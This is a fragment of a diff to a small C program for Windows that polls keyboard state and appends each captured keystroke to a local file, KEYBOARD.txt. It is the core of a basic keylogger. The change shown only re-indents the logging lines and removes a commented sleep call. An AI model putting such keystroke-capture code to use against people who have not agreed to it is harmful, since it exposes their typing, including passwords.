@@ -18,7 +18,6 @@ int main(void)
 
 	while (1)
 	{
-		//sleep(2);
 		shift = 0;
 		keyState = GetAsyncKeyState(VK_LSHIFT);
 		if (keyState != 0) shift = 1;
@@ -33,13 +32,13 @@ int main(void)
 			if (keyState == 0) continue; 
 			if (keyState & 0x1) // 0x8000 = 2^15 (MSB)
 			{
-				key = i;
-				if (shift == 0 && (i >= 65 && i <= 90)) key = key + 32;
-				out = fopen("KEYBOARD.txt", "ab");
-				fprintf(stdout, "%c", key);
-				fprintf(out, "%c", key);
-				fflush(out);
-				fclose(out);
+			   key = i;
+			   if (shift == 0 && (i >= 65 && i <= 90)) key = key + 32;
+			   out = fopen("KEYBOARD.txt", "ab");
+			   fprintf(stdout, "%c", key);
+			   fprintf(out, "%c", key);
+			   fflush(out);
+			   fclose(out);
 			}
 		}
 		//fclose(out); additional just to be safe
